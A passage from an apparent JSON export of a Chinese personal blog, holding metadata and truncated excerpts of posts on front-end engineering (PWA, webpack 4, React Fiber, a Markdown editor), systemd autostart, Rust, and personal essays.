信息可视化\r\n\r\n在前端主要做的就是信息采集和信息上报，数据到了后端存储后再做信息分析，报警，可视化之类的工作，那么问题来了，首先要确定是到底要**采集哪些数据**？采用什么**上报策略**？所有数据一律上报显然不现实，没那必要，也没那么大存储空间。<strong>……</strong>"
  },
  {
    "fileName": "利用 serviceWorker 快速把网站变成 PWA 应用.md",
    "ID": 42,
    "Title": "利用 serviceWorker 快速把网站变成 PWA 应用",
    "Tags": "前端 | 编程",
    "PublishDate": "2017/12/17 20:16:06",
    "Content": "## 什么是 PWA ？\r\nPWA（Progressive Web Apps）是 Google 提出的用前沿的 Web 技术为网页提供 App 般使用体验的一系列方案。\r\n\r\n## 它是如何做到的？\r\nPWA 主要利用了 service Worker 和 caches API，通过两项技术就可以将 Web App 的所有请求劫持并缓存下来，你可以自由的编写策略去决定是否从后端加载数据，相比原生 App 更新后每次都要重新打包，这就更“一颗赛艇”了。再部署了 Service Worker 后，只需要再配置 manifest.json 文件即可，该文件描述了应用被安装后的图标已经应用名等信息。\r\n```\r\n<link rel=\"manifest\" href=\"/static/manifest.json\">\r\n```\r\n在支持 PWA 的浏览器上，打开页面时会提示是否将该页面安装至桌面，安装后，就能获得和原生 App 近乎一直的体验了，关于 PWA 的支持度可以看[**这里**](https://ispwaready.toxicjohann.com/?from=groupmessage)。\r\n\r\n## 如何快速部署？\r\n#### Service Worker\r\n显然，自己写 Service Worker 和缓存策略逻辑有点麻烦，简单点，我们通过 Webpack 的 sw-precache-webpack-plugin 插件来自动添加 Service Worker，并配置缓存策略，具体配置参考[**这里**](https://github.com/goldhand/sw-precache-webpack-plugin)。<strong>……</strong>"
  },
  {
    "fileName": "写作是一个学习过程.md",
    "ID": 43,
    "Title": "写作是一个学习过程",
    "Tags": "碎念",
    "PublishDate": "2018/3/6 00:59:23",
    "Content": "旅行的意义不在于终点，而是走过的路。\r\n\r\n文章不是目的，写作过程中的思考才是，多数时候我将写作当作一件梳理思考的方法，将思想的过程书写下来，与其说是在写文章，倒不如说是在做记录以方便自己回溯。作为书写者，日后从自己记录的内容中能还原思考的路径是容易的，但他人就未必了，因此也从未考虑过写的东西与他人看。\r\n但书写的时候假设读者的存在是有意义，而且考虑的读者层次越低越好，如果未曾考虑过读者的写作仅是记录和梳理思考，那么考虑读者的写作就意味还需要做某种程度的解释，有一个学习的著名方法叫做费曼方法。\r\n```\r\n费曼技巧有四个简单的步骤：\r\n1. 选择一个概念\r\n2. 把它教给完全不懂的另外一个人\r\n3. 如果卡壳，回到原始材料\r\n4. 回顾后简化语言表达（可选择）\r\n```\r\n通常情况下我们难以找到一个合适的倾听者，但这个方法的核心是表达，因而用语言也好，文字也罢，效果应该是相同的，再考虑方法的第二个步骤，”教给一个完全不懂得另外一个人“，我们可以将文章读者的预设为外行人，这样一来，整个方法都可以用写作来实践，因此，写作即是学习。<strong>……</strong>"
  },
  {
    "fileName": "写一个简单的 Markdown 编辑器.md",
    "ID": 44,
    "Title": "写一个简单的 Markdown 编辑器",
    "Tags": "编码",
    "PublishDate": "2017/12/7 00:28:49",
    "Content": "### 准备工作\r\n首先，我们要有一个敲文档的框框，就你了`<textarea>` 标签！\r\n现在我们有了一个框框，然后我们需要 Duang 的一下把框框里的 MD 标记文本编译成 HTML 标签，如果能带上漂亮的样式就更好了，能支持 yaml 写点元数据就完美了，再多提点要求，能不能根据标题生成目录呢？\r\n\r\n起手式准备好之后，首先解决第一个问题，把 MD 标记语法转 HTML 怎么整？ 前辈们告诉我们不要自己造轮子那是因为他们已经造过了，所以果断祭出 GitHub ，面向 GitHub 编程，于是我们找到了 **[marked.js](https://github.com/chjj/marked)** 。\r\n\r\nMarked.JS ：\r\n> A full-featured markdown parser and compiler, written in JavaScript. Built for speed.\r\n\r\n这是一个 markdown 的解析编译器，你可以直接拿到编译后的 HTML 文本，最重要的是这个轮子提供了介入编译过程的接口，你也可以拿到解析后的 Tokens 自己搞些小动作。\r\n\r\n### 变漂亮点\r\n经过 marked.js 解析后，我们拿到了编译后的 HTML 文本，直接用当然可以，但是不够漂亮啊！所以聪明的你可以自己写些样式了，啥？ 想偷懒？当然，我们肯定有轮子的，依旧祭出神器，我就用了性冷淡的 **[github-markdown-css](https://github.com/sindresorhus/github-markdown-css)**，当然，还有更多选择。\r\n### 搞点事情\r\n#### 支持 YAML 写入元数据\r\n同 Markdown 语法解析一样，YAML 同样也需要相应的解析器，这种轮子自己造是不明智的，硬要做那也没办法了，这里我们使用 **[js-yaml](https://github.com/nodeca/js-yaml)** 。\r\n直接上码：\r\n```typescript\r\n// 添加元数据支持\r\nfunction splitInput(str: string) {\r\n\tif (str.slice(0, 3) !== '---') return\r\n\tlet matcher = /\\n(\\.{3}|-{3})/g\r\n\tlet metaEnd = matcher.exec(str)\r\n\treturn metaEnd && [str.slice(0, metaEnd.index), str.slice(matcher.lastIndex)]\r\n}\r\nconst mySplitInput = splitInput(src)\r\nconst markdown = mySplitInput ?  mySplitInput[1] : src\r\nconst meta = mySplitInput ? yaml.safeLoad(mySplitInput[0]) : null\r\n```\r\n简单利用正则把 --- 或 ... 开头结尾的内容抓出来，然后丢给 js-yaml，打完收工搞定，要怎么利用就自己看着办吧，除去这部分的内容，剩下的交给 marked.js 处理。<strong>……</strong>"
  },
  {
    "fileName": "关于沟通.md",
    "ID": 45,
    "Title": "关于沟通",
    "Tags": "随想",
    "PublishDate": "2015/9/18 22:29",
    "Content": "思考和表达这两种能力并非正相关的，也许你的思考能够达到很深的程度，\r\n但是这并不意味着你能将如此深奥的思考表达出来。\r\n\r\n当我们对某个对象展开思考或者表达时，对于思考而言，我们思考的对象将会随着思考的深度逐渐变得复杂抽象起来，但表达却是另外一个过程，我们需要将表达的对象变得形象，简单，明确起来\r\n\r\n这是两种截然相反的过程，思考时将对象变复杂抽象，而表达确实将思考变得简单形象。\r\n\r\n与思考不同的还有一点就是，思考是为了让自己理解，而表达却是为了让他人理解。\r\n\r\n你想的是A ,说出来的却是B， 别人听到以为C，然后事实却是Ｄ\r\n这样的情况是经常发生的。\r\n\r\n人之患，在好为人师，无论如何，保持谦虚总是一种必要心态，\r\n错误往往是因为过度自信所导致的，而非小心谨慎。<strong>……</strong>"
  },
  {
    "fileName": "关于并发的理解.md",
    "ID": 46,
    "Title": "关于并发的理解",
    "Tags": "编程",
    "PublishDate": "2018/3/4 13:41:37",
    "Content": "在在考虑并发编程中，首先要思考的是时间是什么？ 我们可以简单的将时间看作是施加在所有事件上的顺序。在纯粹的函数式编程中，不论对表达式采用何种求值顺序，应用序，正则序也好，都不会影响最终的求值结果，只是中间过程会有所差别，在这样的编程模型中，我们似乎可以忽略时间施加在事件上的顺序，因此，函数式程序可以进行自动的并行化，没有赋值和可变量，意味着引用透明，即外延相等的函数可以相互替换，如果两个函数对于所有参数产生的结果都是一样的，那么它们就是相等的，可以相互替换的（将函数的结果缓存以加快速度，正是这一思想的诠释）。\r\n\r\n改变从赋值的引入开始，在这之前，求值使用代换模型，如同处理数学函数一样，这个模型并不能处理赋值的场景，因此需要使用更为复杂的环境模型，在这个模型下，考虑并发编程就会带来前所未有的复杂和挑战。当然，有一个概念是始终需要明晰的，那就是关于并发和并行的区别，最简单的理解，并发是同一时间应对多件事情的能力，而并行是同一时间处理多件事情的能力。对于相互较为独立的多个事件而言，我们要想在同一时间应对，那么最好的办法就并行化，将任务分发到不同的处理单元上去。<strong>……</strong>"
  },
  {
    "fileName": "关于可视化页面构建工具的思考.md",
    "ID": 47,
    "Title": "关于可视化页面构建工具的思考",
    "Tags": "编程 | 前端 | 随想",
    "PublishDate": "2018/06/05 21:30",
    "Content": "## 引言\r\n\r\n现代化的企业管理离不开 IT 系统的支撑，而随着业务和人员的扩张，对 IT 系统及 IT 工具的需求也是日益增长的。\r\n\r\n当公司扩张到一定程度时，公司的运作就不能完全依托于人，若是将公司类比于机器，那么要想这部机器能够正常运转，甚至高效运转，那就必须制定合理有效的流程，并研发 IT 系统去承载。\r\n\r\n起初我们做事会沉淀一些优秀的实践，随着这些优秀实践的扩散，就会想到将其规范化、标准化、进一步的甚至转换成流程，再将流程用 IT 系统承载使其自动化。\r\n\r\n这样就会有很多管理信息系统的开发需求、工具开发需求等，来自业务方的需求尽管很多，但大致都是可以归类的，其主要的差异仅仅是因为业务场景的特殊化，从而需要 IT 工具或系统做一些定制化的开发，甚至新做一个。\r\n\r\n这样的成本对公司而言显然是不可接受的，对于程序员来说，重复类似的工作也极易丧失工作动力，那么理所当然的想到如何从这样的重复中脱离出来，而其解决方案就是**可视化页面构建器**，这样的工具相信在不少公司都存在，有用来做活动促销页面的，有用来做中后台管理系统的，有用来做报表的，甚至其它行业的都有，等等。<strong>……</strong>"
  },
  {
    "fileName": "使用 Systemd 设置 Linux 应用自启动.md",
    "ID": 48,
    "Title": "使用 Systemd 设置 Linux 应用自启动",
    "Tags": "编码 | Linux",
    "PublishDate": "2017/12/11 17:27:03",
    "Content": "博客有时候莫名其妙挂掉，看后台访问日志发现一堆类似 /myphpadmin 的路径请求，想来是批量扫描漏洞抓肉鸡的吧，我这小站纯当树洞和 Wiki 使用，价值又不大，随便攻击咯。只是每次重启服务器得把后端服务跑起来有点麻烦，于是稍微学习了下 Linux 下设置应用自启动的方法。\r\n\r\n**有几种方法实现目的**\r\n1. 配置 /etc/rc.d/rc.local 脚本 ，该脚本在引导过程的最后一步被执行\r\n2. 添加脚本至 /etc/rc.d/init.d 子目录，适用于需要细致控制的启动需求\r\n3. 设置 crontab 任务计划服务\r\n4. 使用 systemd 注册服务\r\n\r\n## 关于 Systemd\r\n这是现代 Linux 发行版中的显著变化之一，或许也是最颇具争议的变化。 Systemd 是 Linux 内核启动的第一个程序，并且扮演多种角色，比如启动系统服务，处理登录，定时执行一些任务，其重要性不言而喻，并逐渐成为 Linux 的基础组件的一部分。\r\n\r\n如何通过 Systemd 来注册一个服务呢？举个栗子\r\n```\r\n# /lib/systemd/system/supervisord.service\r\n[Unit]\r\nDescription=Process Monitoring and Control Daemon\r\nAfter=rc-local.service\r\n\r\n[Service]\r\nType=forking\r\nExecStart=/usr/bin/supervisord -c /etc/supervisord/supervisord.conf\r\nSysVStartPriority=99\r\n\r\n[Install]\r\nWantedBy=multi-user.target\r\n```\r\n这是一个开机自动启动 supervisord 的服务配置，嗯，就是博客 Go 后端的守护进程。<strong>……</strong>"
  },
  {
    "fileName": "从静态博客转到Golang + MongoDB后端.md",
    "ID": 49,
    "Title": "从静态博客转到Golang + MongoDB后端",
    "Tags": "编码",
    "PublishDate": "2017/11/29 23:39:47",
    "Content": "因为最近在学 Golang 的缘故，所以顺手就将博客从静态博客改成了 Golang + MongoDB 后端。  \r\nGolang 这门语言初看像是 C 语言的加强版，有 C 语言开发经验的话能够很快上手，以现代编程语言的视角来看，Golang 实在是简洁得有些过分了，少了很多时髦的语法特性，对泛型的支持也经常被人拿出来鞭尸吐槽，但是真正使用下来确实给人一股小清新的感觉，缺失的那些时髦特性并没有给实际开发带来很大麻烦，Golang 简洁实用的官方库带来了非常大的助力，特别是对于网络编程，加上原生对并发的支持，足以弥补很多语法特性缺失的遗憾了。\r\n\r\n总结来说，写的很爽，可以推荐给朋友，用《七周七语言》的话来说，如果学一门新的编程语言不能改变你的编程思想，那就不值得学，恰好，Golang 确实是一门能够改变你编程思想的语言，基于 CSP 的并发模型加上语法级的并发支持，能够让你自由畅快的用并发的思想去构建程序，如果之前缺乏编发编程方面的实践，那 Golang 确实值得投入时间去学习一番。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "从浏览器工作机制看性能优化.md",
    "ID": 50,
    "Title": "从浏览器工作机制看性能优化",
    "PublishDate": "2018/7/9 15:31",
    "Tags": "前端",
    "Content": "## 背景\r\n\r\n之前学习前端过程中做了不少关于性能优化的笔记，但是大多都太零散，无法串联起来，便想写一篇文章将所有知识点串起来，从浏览器的关键渲染路径来看性能优化是非常适合的，当然，前端的性能优化也不仅仅是这些，还有一些后端的优化工作也是非常有效的，决定页面用户体验不仅仅是前端，还有后端的协同工作。\r\n\r\n## 浏览器渲染过程\r\n\r\n### 解析\r\n\r\n1. 用户输入 URL\r\n\r\n2. 从URL 中解析出主机名\r\n\r\n3. DNS 查询解析出主机名对应的服务器 IP\r\n\r\n   先查本地 DNS 缓存记录 （比如 hosts 文件），没有再向 DNS 服务器查询，并将结果缓存\r\n\r\n4. 根据 URL 提供的端口号（默认 80）请求服务器获取静态资源\r\n\r\n   经过三次握手建立 TCP 连接，然后开始传输 HTTP 报文 （Request，Response），HTTP 协议是应用层协议，建立在 TCP/IP 协议上。\r\n\r\n5. 关闭连接，浏览器开始解析文档\r\n\r\n6. 如果文档中涉及其他资源则重复以上动作，直至所有资源加载完毕\r\n\r\n### 渲染\r\n\r\n![](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/browserRender.webp)\r\n\r\n1. 处理 HTML 标记并构建 DOM 树。\r\n\r\n   深度优先遍历过程，默认遇到 script 回解析执行其中的脚本，并堵塞渲染。（加上 defer,  async 属性可以控制执行 javaScript 的执行时间）\r\n\r\n2. 处理 CSS 标记并构建 CSSOM 树。<strong>……</strong>"
  },
  {
    "fileName": "书写以及文字.md",
    "ID": 51,
    "Title": "书写以及文字",
    "Tags": "随想",
    "PublishDate": "2015/1/31 23:06",
    "Content": "人的大部分生命体验是受限于当下的，一切感官所带来的体验都将被时间禁锢于当下，当下即逝，无常处处皆是，即便我们的意识也是如此，虽然我们可以靠着记忆短暂的回溯过去的体验以及思考，但是，大脑并非总是可靠的，即便借助于非凡的记忆，你能记住所有的一切，但是依旧被自身以及时间所限制，你无法将你的体验你的思考跨越时间传递于它人，这是靠语言言传身教所不能做到的。  \r\n文字以及书写的意义就在于此，我们可以将自己的体验，思想寄托于文字，载于书本亦或者其它载体上，相较于人短暂的一身，这些载体却是可以穿越很长一段时空的事物，甚至可以轻易复制，一代，一代流传至永远。  \r\n对于个人而言，书写也许并非为了传递思想，最重要的是回溯自己，你的思考，你的体验，你的一切，都可以化作文字，对于记忆并非出众的我而言，这毫无疑问是最好的恩赐了。  \r\n文字所载的文章变化，忠实的记录着人的改变，从过去的自己中吸取经验，创造更好的未来，将思想一遍一遍洗筛，如同淘金一般，凝结出最深刻的洞见。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "不求甚解与刨根问底.md",
    "ID": 52,
    "Title": "不求甚解与刨根问底",
    "Tags": "随想",
    "PublishDate": "2017/9/5 23:28",
    "Content": "怀疑自己有强迫症，遇到不能理解的问题总是钻牛角尖似的想弄明白，很随意地就能扑在一个问题上耗个几天，有些时候也佩服自己的执着，特别是当一个问题经过冥思苦想最终念头通达的时候，那就像卸下包袱瞬间得到释放和自由的感觉，刷算法题就经常如此。  \r\n\r\n但是，能够念头通达的好运不是时常都有的，总会有那么些问题会像堡垒一样立在你面前，怎么都攻克不了，凭时间去一点一点磨也做不到，这个时候就会感到焦虑和绝望了，这若是智商的天花板，那就更绝望了。对此我更相信，之所以不能解决，并非源自智商，而是缺乏足够的信息，这些信息是经验、知识、实例。刨根问底是好的，如果能够清楚的知道自己到底在哪碰壁，是哪一点不能理解，那么在时间充裕的情况下是可以继续刨下去，但是如果你没法获得足够的信息，甚至不理解自己为何不能理解，那就要适可而止了。  \r\n\r\n我认同刨根问底的精神，但有时候也应当不求甚解，在有限时间内的学习，不能将大量的时间耗在这种刨根问底的行为上，有些东西总是需要有足够的例子去支撑才能理解的，最好是分阶段来，第一阶段不求甚解大量积累案例和知识，再逐步深入细化刨根问底，一开始就想着彻底理解一个东西，那既困难又不现实，反而使自己焦虑，徒增烦恼。<strong>……</strong>"
  },
  {
    "fileName": "不念过去，不畏将来，珍惜现在，再见 2017.md",
    "ID": 53,
    "Title": "不念过去，不畏将来，珍惜现在，再见 2017",
    "Tags": "碎念",
    "PublishDate": "2017/12/31 17:02:01",
    "Content": "2017 年，我很懵。\r\n上半年追逐爱情失利，下半年又接着父亲中风，年底圣诞夜大娘去世，直到现在敲下这些字时也依旧感到缺乏真实感，整个人都是懵的，倘若真是梦该多好啊。\r\n\r\n这一年发生太多事情了，原本行动自如身体硬朗的父亲因病变得行动不便，语言能力丧失，最亲近的大娘也因病去世，而我也结束了自己在深圳打拼的计划。未来彻底陷入了迷茫，我本以为自己的人生基调应该早已注定，努力工作攒钱，然后成家立业，然后教育子女，然后在夕阳下听着音乐休憩。\r\n\r\n生活似乎厌恶平静无澜，因而给了我一阵飓风。<strong>……</strong>"
  },
  {
    "fileName": "七夕.md",
    "ID": 54,
    "Title": "七夕",
    "Tags": "碎念",
    "PublishDate": "2017/8/29 21:59:29",
    "Content": "毫无悬念，这个日子对我而言依旧没有意义，不过倒也过得意外的充实，好死不死的科目二考试约在了8月29日，理所当然，考前当然要好好突击训练一番咯，为此特地请假两天，领导吐槽说，这考试代价真高啊，考试的调休是用双倍工资的钱换来的，当天模拟考试一个半小时就是400块钱花费，如此代价之下不过简直对不起这投入啊。\r\n\r\n考前一天，早上七点半就赶往驾校，平时上班也没这么早啊，泪~~，比早起更可怕的是台风，今年深圳真是神奇了，天鸽刚过不到一周，又迎来今年第14号台风“卡帕”，真是可怕，不得不冒着暴雨练习，在此已经做好了明天雨中考试的准备，好在幸运眷顾，考试当天放晴，艳阳高照，也许我昨天看的是假的天气预报吧，考试的第一把直接挂在左倒库，倒车不入，差点心态爆炸，想着没有压线，位置准的一比，这把肯定稳，结果因为座椅没调给挂了，第二把就随意了，大不了就下月再考呗，结果第二把险过。所以说，科目二考试的不光是技巧和熟练度，还考心理素质啊，回想下平时训练，无非就是那几个套路，对那几个点。  \r\n幸运貌似只眷顾了我？同行三人考试就我一个过了，汗(⊙﹏⊙)b，祝福每天和我一起练车的妹子，辛苦了，感谢~，反正她看不到。^_^  \r\n报名的时候和同事一同报名，想着能一起考，结果两个女同事率先完成了科目二考试，快的都已经考科目三了。<strong>……</strong>"
  },
  {
    "fileName": "《逻辑的引擎》读后感.md",
    "ID": 55,
    "Title": "《逻辑的引擎》读后感",
    "Tags": "碎念 | 读书",
    "PublishDate": "2018/2/26 00:56:10",
    "Content": ">  计算机是数学家一次失败思考的产物。   ——无名氏\r\n\r\n从一篇博文上又看到了《逻辑的引擎》这本书的推荐，于是找来电子书连夜看完，看完后，对于计算机的存在又再次感到震撼，尽管曾读过《编码》、《深入理解计算机系统》之类的书，对计算机的组成也有一点了解，也许对于正在使用的这台机器而言，它称得上是制造业的奇迹，数以亿计的晶体管凝聚的造物，但是它又何尝不是人类心智的荣耀在现世的具现呢。\r\n\r\n计算机的诞生是一场历经三个世纪的征程，一切从莱布里茨之梦开始。\r\n\r\n首先考察我们理性的根基，当我们在思考中所称的逻辑推理是什么？他与计算有什么区别？二者似乎是一个硬币的两面，逻辑推理的过程可以通过布尔代数等代数体系的计算来表达，而数学计算又可以被描述成一个数理逻辑的的推理过程，莱布里茨之梦就是这样一个想法，找到一个描述人类普遍概念的符号系统以及操作这些符号的规则，从而可以将现实问题用这套符号系统表达，利用这些符号的规则进行推理或者称之为计算，以此来得到问题的答案。显然，这种过程是机械的，因此我们可以为其创造一台机器来执行这个过程。<strong>……</strong>"
  },
  {
    "fileName": "《寻梦环游记》观后感 - 终极的死亡.md",
    "ID": 56,
    "Title": "《寻梦环游记》观后感 - 终极的死亡",
    "Tags": "碎念",
    "PublishDate": "2017/12/6 20:40:50",
    "Content": "看到朋友圈都在推荐这部片子，评分高的惊人，我本不是喜欢追电影的人，除非有约我很少去看电影，之前因为某种原因特意办了附近电影院的会员卡，现在卡上还有些余额，想来以后估计也没机会用了，加上离职时间有闲，便买了电影票。\r\n一个人看电影的体验说不上好，若是电影厅人多的时候，两边皆是情侣的话，那对我可能就是折磨了，所以难得一个人去看场电影就选了一个冷门的时间段，下午两点又非周末，这个时间都在上班，想来除了自己应该也没多少人能选这个任性的时段了吧，不出所料，进 ZMAX 厅之后，偌大一空间就后排远处有一对，几近包场的体验，也算运气不错。\r\n电影有些出乎意料，虽说讲小孩追逐音乐梦想的过程，但揭示的却是亲情的重要性，电影是外国人的视角，但展开却颇具中国风，电影从祭奠祖先开始，清明节换成了墨西哥的亡灵节，想必这也是为什么评分如此之高的缘故之一，对于祭奠祖先，中国人都深有感触。\r\n小孩的曾曾祖父因为追逐音乐梦想抛弃了家庭，导致从那一辈开始，音乐就成了一个诅咒的词汇，整个家族以制鞋为业，若是主角小孩承袭家业继续制鞋的话，故事就没得讲了，小孩也和那个被诅咒的曾曾祖父一样爱上了音乐。“抓住机会，坚持梦想”这样的话语种下了反抗的种子。<strong>……</strong>"
  },
  {
    "fileName": "Webpack 4 升级.md",
    "ID": 57,
    "Title": "Webpack 4 升级",
    "Tags": "前端",
    "PublishDate": "2018/3/14 01:12:51",
    "Content": "因为依赖的关系，无法直接使用 npm up webpack 的方式更新，需要重新安装 webpack 4，除此之外还需要安装 webpack-cli ，然后一路跟着错误提示修改即可。\r\n1. >\r\n  The CLI moved into a separate package: webpack-cli.\r\n  Please install 'webpack-cli' in addition to webpack itself to use the CLI.\r\n  -> When using npm: npm install webpack-cli -D\r\n  -> When using yarn: yarn add webpack-cli -D\r\n\r\n照提示安装 weboack-cli 即可\r\n\r\n2. > Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.\r\n\r\n这个插件在 webpack4 里已经不用手动引入了，直接 optimization.minimize 为 true 就行，生产模式下自动为 true。\r\n\r\n\r\n3. >\r\n  Error: webpack.optimize.CommonsChunkPlugin has been removed, please use config.optimization.splitChunks instead.\r\n\r\nCommonsChunkPlugin 已经再见，变为 optimization.splitChunks 和 optimization.runtimeChunk 两个配置，默认配置就会对异步请求的模块进行提取拆分，更多介绍看*[这里](https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366)*。\r\n\r\n4. >\r\nWebpack 4: compilation.mainTemplate.applyPluginsWaterfall is not a function\r\n\r\n解决办法 npm uninstall html-webpack-plugin 然后重装\r\n\r\n5. >\r\n  DeprecationWarning: Tapable.plugin is deprecated. Use new API on `.hooks` instead  77% module and chunk tree optimization unnamed compat plugin(node:14460) UnhandledPromiseRejectionWarning: \r\n\r\n依旧重装 extract-text-webpack-plugin 。\r\n\r\nwebpack 终于知道约定优于配置了，parcel 恐成最大输家。<strong>……</strong>"
  },
  {
    "fileName": "Web Worker 与 Service Worker.md",
    "ID": 58,
    "Title": "Web Worker 与 Service Worker",
    "Tags": "前端 | 编程",
    "PublishDate": "2017/12/16 21:09:35",
    "Content": "### Web Worker\r\n众所周知，浏览器的 JavaScript 是单线程的运行的，但随着 Web 应用的日趋复杂，越来越多的计算任务被分配给了前端，单线程运行的 JavaScript 早已不堪重负，因此就如何将 JavaScript 从单线程的地狱中解放出来就成问题了，因此诞生了 Web Worker， 它是脱离主线程之外的，因此一些复杂耗时的活可以交给它来干，但是有一点就是它不能操作 DOM，因此需要通过 postMessage 方法将执行结果告诉主线程，主线程通过 onMessage 方法获取返回结果。\r\n\r\n### Service Worker\r\n上面说到 Web Worker 解放了 JavaScript 的主线程，但有一个缺点就是 Web Worker 只是一个临时工而已，如果要长期存在且听候差遣呢？于是乎 Service Worker 应运而生，Service Worker 在 Web Worker 的基础上加上了持久离线缓存能力。\r\n\r\n#### 那么 Service Worker 到底用来干啥的呢？\r\nService Worker 有以下功能和特性：\r\n* 一个独立的 worker 线程，独立于当前网页进程，有自己独立的 worker context。\r\n* 一旦被 install，就永远存在，除非被 uninstall\r\n* 需要的时候可以直接唤醒，不需要的时候自动睡眠（有效利用资源，此处有坑）\r\n* 可编程拦截代理请求和返回，缓存文件，缓存的文件可以被网页进程取到（包括网络离线状态）\r\n* 离线内容开发者可控\r\n* 能向客户端推送消息\r\n* 不能直接操作 DOM\r\n* 出于安全的考虑，必须在 HTTPS 环境下才能工作\r\n* 异步实现，内部大都是通过 Promise 实现\r\n\r\n简单来说，它可以代理你的前端所有请求，通过它再结合 caches API 你可以把所有的静态资源，甚至网络请求的数据缓存起来，然后由你自己编写的策略来决定是否去从后端取。我们知道原生 App 应用之所以能够获得很好的体验，一部分原因是因为它在断网的情况下依旧能使用部分功能，它的资源都是和 App 安装包打包到一起的，不需要频繁从后端去取。<strong>……</strong>"
  },
  {
    "fileName": "ukulele.md",
    "ID": 59,
    "Title": "ukulele",
    "Tags": "碎念",
    "PublishDate": "2017/7/22",
    "Content": "![](http://imglf.nosdn.127.net/img/UUcvQWZBZk9URHlpWHl5UmRMQkRPRU5aRHB5cVl6RnhNZWlaTnJLOXVjN1B0MUUxdTNXY0lnPT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n\r\n![](http://imglf.nosdn.127.net/img/UUcvQWZBZk9URHlpWHl5UmRMQkRPTUo3WjFUMWxYNUdNUG15MWw0QUZtdURYNnFoQXg3QVR3PT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n\r\n一直想学个乐器来挑战下，在吉他和Ukulele之间犹豫了很久，直到看了jake shimabukuro的视频，卧槽？！这还能这么玩？于是便被种草了。  \r\n 当晚就在狗东下单买了kaka KUC-MAD，即便明知道可能是吃灰的命运，但依旧毫无犹豫。  \r\n 管他呢，再不济也能当做摄影道具，摆件，或者墙饰之类的。（我这样安慰自己=。=）\r\n\r\n    <strong>……</strong>"
  },
  {
    "fileName": "Rust 学习笔记.md",
    "ID": 60,
    "Title": "Rust 学习笔记",
    "Tags": "编程",
    "PublishDate": "2018/8/6 19:25:28",
    "Content": "### 为什么学习 Rust ？\r\n\r\n* 宏\r\n* 采用所用权系统来避免 GC 保障内存安全（**好奇**）\r\n* 零开销抽象性能高，又有很多现代编程语言的特性\r\n* 官方对 WebAssembly 支持度高，编译到 WASM 很方便\r\n* **不折腾不舒服斯基**\r\n\r\n相对于 Go 来说，Rust 的概念还是蛮多的，那怎么学一门新的编程语言呢？如果有其它编程语言的经验，那么学习一门新的编程语言是比较容易的，学习过程更多的是知识迁移，如果是学习新的编程范式则会稍有难度，这不仅仅是学习新的概念，还需要在思维模式上做出改变，对于编程语言的学习，应当多去学习不同范式的语言，尽管现代编程语言都支持多范式，但各语言擅长的范式还是不一样的。\r\n\r\n无论如何，不同编程范式的语言都有通用的编程概念，迅速找到这些**通用概念**在该语言中的表达方式就能快速上手写代码了，比如`变量声明、数据类型、控制流、函数`，然后再去学习这些语言里的独特概念并付诸实践。要把代码写好，还需要付出更多精力去学习这门语言的优秀实践。\r\n\r\n后续会持续学习 Rust，并补充笔记，然后写一个 Rust 编译到 [WwebAssembly](https://developer.mozilla.org/zh-CN/docs/WebAssembly) 的例子。\r\n\r\n## 基本的表达方式\r\n\r\n### 声明\r\n\r\n`let` 应该理解成 scheme 里的绑定，而非变量，所有值默认是不可变的，需要通过 `let mut`来声明可变性。<strong>……</strong>"
  },
  {
    "fileName": "rem、vhvw 学习笔记.md",
    "ID": 61,
    "Title": "rem、vh/vw 学习笔记",
    "Tags": "前端",
    "PublishDate": "2018/7/27 18:03:30",
    "Content": "一直以来工作多是以 PC 端业务居多，很少涉及移动端，最近在一家互联网公司的工作内容却恰好相反，移动端居多，PC 端业务较少，适配这块用的是 flexible ，不满足于黑箱的便利性，适当整理了下这块的知识做了些笔记。\r\n\r\n### rem\r\n\r\nrem 是指相对根元素的 font-size，这个根元素通常是指 `<html>` 元素。根元素可以通过 `:root`伪类选择器来表示。\r\n\r\n### vh/vw\r\n\r\n`vh/vw` 是相对**视窗**的大小（视窗包括滚动条宽度），与 `%` 不同，百分比是相对宽高，相对谁是不确定的，通常是父元素，对于 `font-size` 属性，`%` 相对的是 `em`，`1vw ＝ 1/100th viewport width`等于 `window.innerWidth`的`1%`。\r\n\r\n### rem 适配原理\r\n\r\n移动端响应适配主要是通过查询设备宽度自动调整根元素大小来实现的，查询设备宽度可以使用 CSS 的媒体查询，但是不同分辨率的转换较为复杂，所以通常使用 JS 来做。<strong>……</strong>"
  },
  {
    "fileName": "React Fiber 初探.md",
    "ID": 62,
    "Title": "React Fiber 初探",
    "Tags": "前端",
    "PublishDate": "2018/8/18 23:47",
    "Content": "## 为什么要有 React Fiber\r\n\r\n尽管 React 有非常优秀的  Vitural DOM Diff 算法，但是对于一个复杂的页面而言，React 的调度策略 Stack Reconcile 会深度优先遍历所有的 Vitural DOM 并 Diff 计算完成后才会将主线程释放，这个期间用户与浏览器的任何交互都是得不到反馈的，表现出的样子就是浏览器僵死，只有任务结束后才得到响应，函数的调用栈就像下面这个样子。\r\n\r\n![img](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/fiber2.jpg) \r\n\r\n怎么才能使用户察觉不出卡顿？控制渲染绘制时间小于 **16.6ms**。\r\n\r\n为什么是 16.6ms？一般用户的显示器都是 60Hz 的刷新率，那意味着每帧的绘制时间只有 1000ms / 60 ~ 16.6ms，一但渲染时间超过这个时间，用户就能察觉到卡顿，当然，这里的 16.6ms 是对于动画而言的，通常页面并不会变化如此频繁，如果你用 JS 写动画就要考虑这点了。\r\n\r\n因此，我们不能让 Vitural DOM 这样相对耗时复杂任务长期占据主线程堵塞渲染，在不考虑突破浏览器单线程模型的情况下，**我们只能将这个耗时的长任务分片处理**，这就是 React Fiber 做的，在此之后函数的调用栈就长这样了。\r\n\r\n![img](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/fiber1.jpg) \r\n\r\n**那若是用多线程呢？** 应用 Web Worker，我们可以把一些耗时的任务放入 Web Worker 中去处理，而且也不会堵塞渲染，它不正是做这种事情嘛。<strong>……</strong>"
  },
  {
    "fileName": "koa-compose 浅析.md",
    "ID": 63,
    "Title": "koa-compose 浅析",
    "Tags": "前端",
    "PublishDate": "2018/8/1 22:07",
